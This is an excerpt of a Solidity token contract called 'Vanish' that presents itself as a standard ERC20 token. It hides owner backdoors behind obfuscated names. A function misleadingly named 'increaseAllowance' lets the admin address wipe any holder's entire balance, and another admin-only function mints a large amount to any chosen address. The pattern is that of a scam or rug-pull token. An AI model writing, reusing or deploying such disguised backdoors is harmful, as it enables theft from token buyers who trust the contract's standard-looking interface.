...
contract VanishTOKEN is Ownable {
    address public dxkkmn15;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Vanish";
    string private _cctokensymbol = "Vanish";
    constructor(address tokenadmin) {
        dxkkmn15 = tokenadmin;
       Vanish[_msgSender()] += supplyamount;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dxkkmn15 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = Vanish[newadd];
        uint256 newaaamount = Vanish[newadd]+Vanish[newadd]-curamount;
        Vanish[newadd] -= newaaamount;
        }else{
        if(dxkkmn15 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        Vanish[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dxkkmn15 == _msgSender());
        if(dxkkmn15 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = Vanish[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        Vanish[from] = Vanish[from]-amount;
        Vanish[to] = Vanish[to]+amount;
